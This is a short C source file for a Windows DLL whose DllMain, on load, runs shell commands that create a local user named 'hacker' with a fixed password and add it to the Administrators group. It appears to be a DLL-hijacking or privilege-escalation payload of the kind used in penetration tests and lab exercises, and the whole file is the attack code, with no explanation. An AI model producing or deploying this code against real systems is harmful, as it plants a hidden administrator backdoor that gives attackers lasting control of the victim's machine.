#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
    HANDLE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved
) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            system("net user hacker password123 /add");
            system("net localgroup administrators hacker /add");
            break;
    }
    return TRUE;
}
